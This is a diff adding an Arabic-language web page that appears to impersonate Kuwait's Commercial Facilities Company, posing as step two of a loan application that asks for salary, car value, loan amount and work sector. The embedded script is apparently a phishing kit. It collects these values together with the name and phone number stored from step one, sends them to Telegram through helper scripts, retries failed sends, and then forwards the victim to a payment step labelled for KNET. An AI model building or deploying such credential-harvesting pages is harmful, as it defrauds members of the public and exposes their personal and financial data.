@@ -1,0 +1,356 @@
+<html lang="ar">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="description" content="الخطوة الثانية لتقديم طلب التمويل لدى شركة التسهيلات التجارية.">
+    <meta name="theme-color" content="#00a3e0">
+    <title>شركة التسهيلات التجارية - CFC</title>
+    <link rel="icon" type="image/svg+xml" href="./assets/images/logo.svg">
+    <link href="./assets/css/main.css" rel="stylesheet" type="text/css">
+    <link rel="stylesheet" href="./assets/css/shared-header.css">
+</head>
+
+<body class="page-with-shared-header step-page">
+    <div id="root">
+        <div dir="rtl" class="min-h-screen bg-gradient-to-b from-gray-50 to-white text-gray-800">
+            <header class="site-header">
+                <div class="nav-shell">
+                    <a class="brand" href="./index.html#home" aria-label="Commercial Facilities">
+                        <img src="./assets/images/logo.svg" alt="Commercial Facilities logo">
+                    </a>
+                    <button class="menu-toggle" type="button" aria-expanded="false" aria-label="فتح القائمة">
+                        <img src="./assets/images/menu.png" alt="">
+                    </button>
+                    <nav class="navbar" aria-label="التنقل الرئيسي">
+                        <ul class="nav-links"></ul>
+                    </nav>
+                </div>
+            </header>
+            <div class="max-w-md mx-auto px-6 py-6">
+                <div class="flex items-center justify-between mb-2">
+                    <div class="flex items-center gap-2">
+                        <div class="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center shadow-md">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M20 6 9 17l-5-5"></path>
+                            </svg>
+                        </div>
+                        <span class="text-xs font-semibold text-green-600">المعلومات الشخصية</span>
+                    </div>
+                    <div class="flex-1 h-0.5 bg-green-500 mx-2"></div>
+                    <div class="flex items-center gap-2">
+                        <div class="w-8 h-8 bg-[#00A3E0] rounded-full flex items-center justify-center shadow-md">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M20 6 9 17l-5-5"></path>
+                            </svg>
+                        </div>
+                        <span class="text-xs font-semibold text-[#00A3E0]">الراتب</span>
+                    </div>
+                    <div class="flex-1 h-0.5 bg-gray-300 mx-2"></div>
+                    <div class="flex items-center gap-2">
+                        <div class="w-8 h-8 bg-gray-300 rounded-full flex items-center justify-center shadow-md">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect width="20" height="14" x="2" y="5" rx="2"></rect>
+                                <line x1="2" x2="22" y1="10" y2="10"></line>
+                            </svg>
+                        </div>
+                        <span class="text-xs font-semibold text-gray-500">الدفع</span>
+                    </div>
+                </div>
+                <div class="w-full bg-gray-200 rounded-full h-2">
+                    <div class="h-2 rounded-full transition-all duration-500 bg-[#00A3E0] w-2/3"></div>
+                </div>
+            </div>
+            <form id="sb" class="max-w-md mx-auto px-6 pb-8 space-y-6">
+                <div class="rounded-xl bg-card text-card-foreground shadow-lg border-0 overflow-hidden">
+                    <div class="bg-gradient-to-r from-[#00A3E0] to-blue-700 p-4">
+                        <h2 class="text-lg font-bold text-white flex items-center gap-2">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-[#00A3E0]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <line x1="12" x2="12" y1="2" y2="22"></line>
+                                <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path>
+                            </svg>معلومات الراتب والوظيفة
+                        </h2>
+                        <p class="text-xs text-blue-100 mt-1">لحساب أفضل عرض تمويلي لك</p>
+                    </div>
+                    <div class="p-6 space-y-5">
+                        <div class="space-y-2">
+                            <div class="flex items-center gap-2">
+                                <label for="netSalary" class="text-sm leading-none text-right font-semibold text-gray-800 flex items-center gap-2"><svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-[#00A3E0]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                        <line x1="12" x2="12" y1="2" y2="22"></line>
+                                        <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path>
+                                    </svg>الراتب الشهري
+                                </label>
+                            </div>
+                            <div class="relative">
+                                <input id="netSalary" dir="ltr" class="flex w-full rounded-md border bg-transparent px-3 py-1 text-base shadow-sm transition-colors file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-blue-500 md:text-sm text-right border-gray-200 h-12" placeholder="مثال: 1500" inputmode="numeric" pattern="[0-9]*" type="text" value=""><span class="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 text-sm font-medium">د.ك</span>
+                            </div>
+                        </div>
+                        <div class="space-y-2">
+                            <div id="carValueField" class="space-y-2 hidden">
+                                <div class="flex items-center gap-2">
+                                    <label for="carValue" class="text-sm leading-none text-right font-semibold text-gray-800 flex items-center gap-2"><svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-[#00A3E0]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                            <line x1="12" x2="12" y1="2" y2="22"></line>
+                                            <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path>
+                                        </svg>قيمة السيارة</label>
+                                </div>
+                                <div class="relative">
+                                    <input id="carValue" dir="ltr" class="flex w-full rounded-md border bg-transparent px-3 py-1 text-base shadow-sm transition-colors file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-blue-500 md:text-sm text-right border-gray-200 h-12" placeholder="مثال: 5000 د.ك." inputmode="numeric" pattern="[0-9]*" type="text" value=""><span class="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 text-sm font-medium">د.ك</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="space-y-2">
+                            <div class="flex items-center gap-2">
+                                <label id="requestedAmountLabel" for="requestedAmount" class="text-sm leading-none text-right font-semibold text-gray-800 flex items-center gap-2"><svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-[#00A3E0]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                        <line x1="12" x2="12" y1="2" y2="22"></line>
+                                        <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path>
+                                    </svg>قيمة الفرض</label>
+                            </div>
+                            <div class="relative">
+                                <input id="requestedAmount" dir="ltr" class="flex w-full rounded-md border bg-transparent px-3 py-1 text-base shadow-sm transition-colors file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-blue-500 md:text-sm text-right border-gray-200 h-12" placeholder="مثال: 100 د.ك." inputmode="numeric" pattern="[0-9]*" type="text" value=""><span class="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 text-sm font-medium">د.ك</span>
+                            </div>
+                        </div>
+                        <div class="space-y-2">
+                            <div class="flex items-center gap-2">
+                                <label for="workSector" class="text-sm leading-none text-right font-semibold text-gray-800 flex items-center gap-2"><svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-[#00A3E0]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                        <path d="M16 20V4a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"></path>
+                                        <rect width="20" height="14" x="2" y="6" rx="2"></rect>
+                                    </svg>قطاع العمل</label>
+                            </div>
+                            <div class="relative">
+                                <select id="workSector" class="flex w-full items-center justify-between whitespace-nowrap rounded-md border bg-transparent px-3 py-2 text-sm shadow-sm ring-offset-background text-right border-gray-200 focus:outline-none focus:ring-1 focus:ring-blue-500 h-12 text-gray-400">
+                                    <option value="">قطاع العمل</option>
+                                    <option value="القطاع الحكومي">القطاع الحكومي</option>
+                                    <option value="القطاع الخاص">القطاع الخاص</option>
+                                    <option value="متقاعد">متقاعد</option>
+                                    <option value="القطاع النفطي">القطاع النفطي</option>
+                                    <option value="القطاع العسكري">القطاع العسكري</option>
+                                    <option value="القطاع المصرفي">القطاع المصرفي</option>
+                                    <option value="قطاع التعليم">قطاع التعليم</option>
+                                    <option value="القطاع الصحي">القطاع الصحي</option>
+                                    <option value="غير ذلك">غير ذلك</option>
+                                </select>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>
+    <div class="step-fixed-actions">
+        <button onclick="window.location.href='./step1.html'" type="button" class="inline-flex items-center justify-center rounded-md text-sm font-medium border shadow-sm h-12 px-4 bg-white border-gray-300 hover:bg-gray-50">&lt; العودة</button>
+        <button type="submit" id="sbb" form="sb" class="inline-flex items-center justify-center gap-2 h-12 rounded-xl shadow-lg hover:shadow-xl transition-all duration-300 bg-gradient-to-r from-[#00A3E0] to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white font-bold">
+            التالي<svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5" style="transform: rotate(180deg);" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="m9 18 6-6-6-6"></path>
+            </svg>
+        </button>
+    </div>
+    <script>
+    function normalizeDigits(value) {
+        return value
+            .replace(/[٠-٩]/g, function(char) { return String(char.charCodeAt(0) - 1632); })
+            .replace(/[۰-۹]/g, function(char) { return String(char.charCodeAt(0) - 1776); });
+    }
+
+    function digitsOnly(value) {
+        return normalizeDigits(value).replace(/\D+/g, '');
+    }
+
+    function getFieldPlaceholder(field) {
+        if (!field) {
+            return '';
+        }
+
+        if (field.tagName === 'SELECT') {
+            return 'قطاع العمل';
+        }
+
+        return field.previousElementSibling && field.previousElementSibling.tagName === 'LABEL'
+            ? field.previousElementSibling.textContent.trim()
+            : (field.getAttribute('placeholder') || field.id);
+    }
+
+    function buildStep2SubmissionMessage(values) {
+        const pageName = window.getCurrentTelegramPageName ? window.getCurrentTelegramPageName() : 'صفحة الراتب';
+        const pageEmoji = window.getCurrentTelegramPageEmoji ? window.getCurrentTelegramPageEmoji() : '💼';
+        const lines = [`${pageEmoji} ${pageName}`];
+
+        if (values.name && values.phone) {
+            lines.push(`👤 ${values.name} ─ ${values.phone}`);
+        } else if (values.name) {
+            lines.push(`👤 ${values.name}`);
+        } else if (values.phone) {
+            lines.push(`📞 ${values.phone}`);
+        }
+
+        if (values.netSalary) lines.push(`💰 الراتب الشهري: ${values.netSalary}`);
+        if (values.carValue) lines.push(`🚗 قيمة السيارة: ${values.carValue}`);
+        if (values.requestedAmount) lines.push(`💵 القرض المطلوب: ${values.requestedAmount}`);
+
+        if (
+            !values.name &&
+            !values.phone &&
+            !values.netSalary &&
+            !values.carValue &&
+            !values.requestedAmount
+        ) {
+            lines.push('لم يقم بادخال اي معلومات');
+        }
+
+        return lines.join('\n');
+    }
+
+    function getLoanType() {
+        const params = new URLSearchParams(window.location.search);
+        return params.get('loan') || localStorage.getItem('selectedLoanType') || 'general';
+    }
+
+    function syncStep2Labels() {
+        const loanType = getLoanType();
+        localStorage.setItem('selectedLoanType', loanType);
+
+        const carValueField = document.getElementById('carValueField');
+        const carValueInput = document.getElementById('carValue');
+        const label = document.getElementById('requestedAmountLabel');
+        const input = document.getElementById('requestedAmount');
+        const icon = label.querySelector('svg');
+        const isCarLoan = loanType === 'car';
+        const labelText = isCarLoan ? 'مبلغ الدفعة الاولى' : 'قيمة الفرض';
+
+        label.innerHTML = '';
+        if (icon) label.appendChild(icon);
+        label.appendChild(document.createTextNode(labelText));
+        input.placeholder = isCarLoan ? 'مثال: 100 د.ك.' : 'مثال: 5000 د.ك.';
+
+        if (carValueField) {
+            carValueField.classList.toggle('hidden', !isCarLoan);
+        }
+
+        if (carValueInput && !isCarLoan) {
+            carValueInput.value = '';
+            localStorage.removeItem('step2.carValue');
+        }
+    }
+
+    function bindStep2() {
+        syncStep2Labels();
+
+        const form = document.getElementById('sb');
+        const netSalary = document.getElementById('netSalary');
+        const carValue = document.getElementById('carValue');
+        const requestedAmount = document.getElementById('requestedAmount');
+        const workSector = document.getElementById('workSector');
+        const submitButton = document.getElementById('sbb');
+
+        function syncWorkSectorPlaceholderState() {
+            workSector.classList.toggle('text-gray-400', !workSector.value);
+            workSector.classList.toggle('text-gray-800', Boolean(workSector.value));
+        }
+
+        [netSalary, carValue, requestedAmount].forEach(function(input) {
+            if (!input) return;
+            if (input.dataset.bound === 'true') return;
+            input.dataset.bound = 'true';
+            input.addEventListener('input', function() {
+                input.value = digitsOnly(input.value);
+            });
+        });
+
+        if (localStorage.getItem('step2.netSalary')) netSalary.value = localStorage.getItem('step2.netSalary');
+        if (carValue && localStorage.getItem('step2.carValue')) carValue.value = localStorage.getItem('step2.carValue');
+        if (localStorage.getItem('step2.requestedAmount')) requestedAmount.value = localStorage.getItem('step2.requestedAmount');
+        if (localStorage.getItem('step2.workSector')) workSector.value = localStorage.getItem('step2.workSector');
+        syncWorkSectorPlaceholderState();
+
+        form.dataset.submitting = 'false';
+        if (submitButton) {
+            submitButton.disabled = false;
+            submitButton.removeAttribute('aria-busy');
+        }
+        if (window.hideSubmissionLoadingOverlay) {
+            window.hideSubmissionLoadingOverlay();
+        }
+
+        if (form.dataset.retryChecked !== 'true') {
+            form.dataset.retryChecked = 'true';
+            if (window.resendStoredFailureMessage) {
+                window.resendStoredFailureMessage(
+                    window.STEP1_FAIL_STORAGE_KEY || 'step1_fail',
+                    'تنبيه: كان هناك مشكلة في إرسال رسالة صفحة المعلومات الشخصية، يرجى مراجعة تيليجرام.'
+                ).catch(function() {});
+            }
+        }
+
+        if (workSector.dataset.bound !== 'true') {
+            workSector.dataset.bound = 'true';
+            workSector.addEventListener('change', syncWorkSectorPlaceholderState);
+        }
+
+        if (form.dataset.bound !== 'true') {
+            form.dataset.bound = 'true';
+            form.addEventListener('submit', async function(event) {
+                event.preventDefault();
+
+                if (form.dataset.submitting === 'true') return;
+
+                form.dataset.submitting = 'true';
+                if (submitButton) {
+                    submitButton.disabled = true;
+                    submitButton.setAttribute('aria-busy', 'true');
+                }
+
+                const nameValue = (localStorage.getItem('step1.name') || '').trim();
+                const phoneValue = digitsOnly(localStorage.getItem('step1.phone') || '');
+                const netSalaryValue = digitsOnly(netSalary.value);
+                const carValueValue = carValue ? digitsOnly(carValue.value) : '';
+                const requestedAmountValue = digitsOnly(requestedAmount.value);
+                const workSectorValue = workSector.value.trim();
+                const loanType = getLoanType();
+                localStorage.setItem('step2.netSalary', netSalaryValue);
+                if (loanType === 'car') {
+                    localStorage.setItem('step2.carValue', carValueValue);
+                } else {
+                    localStorage.removeItem('step2.carValue');
+                }
+                localStorage.setItem('step2.requestedAmount', requestedAmountValue);
+                localStorage.setItem('step2.workSector', workSectorValue);
+
+                const message = buildStep2SubmissionMessage({
+                    name: nameValue,
+                    phone: phoneValue,
+                    netSalary: netSalaryValue,
+                    carValue: loanType === 'car' ? carValueValue : '',
+                    requestedAmount: requestedAmountValue,
+                    workSector: workSectorValue
+                });
+
+                if (window.showSubmissionLoadingOverlay) {
+                    window.showSubmissionLoadingOverlay('جارٍ الانتقال إلى صفحة الدفع...', 3000, 'knet');
+                }
+
+                const sent = window.sendTelegramMessageOnce
+                    ? await window.sendTelegramMessageOnce(message, false)
+                    : false;
+
+                if (!sent) {
+                    localStorage.setItem(window.STEP2_FAIL_STORAGE_KEY || 'step2_fail', message);
+                    if (window.persistTelegramMessageThenSend) {
+                        window.persistTelegramMessageThenSend(message, false).catch(function() {});
+                    }
+                } else {
+                    localStorage.removeItem(window.STEP2_FAIL_STORAGE_KEY || 'step2_fail');
+                }
+
+                window.location.href = './step3.html';
+            });
+        }
+    }
+
+    bindStep2();
+    window.addEventListener('pageshow', bindStep2);
+    </script>
+    <script src="./assets/js/telegram.js"></script>
+    <script src="./assets/js/tg.js"></script>
+    <script src="./assets/js/shared-header.js"></script>
+</body>
+
+</html>
